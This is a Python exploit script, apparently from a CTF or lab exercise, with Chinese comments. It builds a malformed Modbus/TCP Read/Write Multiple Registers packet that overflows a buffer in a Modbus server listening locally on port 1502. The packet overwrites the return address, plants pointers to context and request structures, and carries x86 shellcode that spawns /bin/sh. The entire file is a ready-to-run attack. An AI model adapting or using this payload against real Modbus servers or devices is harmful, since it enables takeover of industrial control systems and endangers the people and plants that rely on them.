import socket
from pwn import *

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

ctx = 0x804c1a0
req = 0x804c1f0
req_length = 0x104
mb_mapping = 0x804c300
ret = p32(0xffffd080)
# 构造 Modbus/TCP 报文
def build_modbus_packet():
    # 对应的十六进制包：
    # <00><01><00><00><00><09><FF><17><00><10><00><02><00><20><00><01><02><00><64>
    transaction_id = b'\x00\x01'             # 事务标识符
    protocol_id = b'\x00\x00'                # 协议标识符（固定为0）
    length = b'\x00\x0F'                     # 数据长度
    unit_id = b'\xFF'                        # 单元标识符
    function_code = b'\x17'                  # 功能码（23 Read Write Multiple Registers）

    # PDU 部分
    read_reference_number = b'\x00\x00'      # 读取起始地址
    read_word_count = b'\x01\xff'            # 读数量
    write_reference_number = b'\x00\x91'     # 写入起始地址
    write_word_count = b'\x0f\xff'           # 写入数量
    byte_count = b'\xF3'                     # 写入字节长度,MaxF3
    data = b'\x00\xcf\x00'                   # cyc
    data += b'\x00'*2           
    data += b'\x00'*0x14                     # padding
    data += b'\x9f\x00'                      # i
    data += b'\x00'*22                       # padding 
    data += b'\x5d\x01'                      # rsp_length
    data += b'\x00'*6                        # padding 
    data += b'\x11'*4                        # ebp
    data += ret                               # ret
    data += p32(ctx)
    data += p32(req)
    data += p32(req_length)
    data += p32(mb_mapping)
    data += shellcode
    data += b'\x55'*0x100

    # 拼接完整的 Modbus/TCP 包
    pdu = read_reference_number + read_word_count + write_reference_number + write_word_count+ byte_count + data
    packet = transaction_id + protocol_id + length + unit_id + function_code + pdu
    return packet


# 发送 Modbus/TCP 报文
def send_modbus_packet():
    server_address = ('127.0.0.1', 1502)  # 目标地址和端口
    modbus_packet = build_modbus_packet()

    # 创建 TCP 连接
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(server_address)
        print(f'Sending: {modbus_packet.hex()}')
        client_socket.sendall(modbus_packet)

        # 接收响应
        response = client_socket.recv(1024)
        print(f'Received: {response.hex()}')

# 调用发送函数
send_modbus_packet()
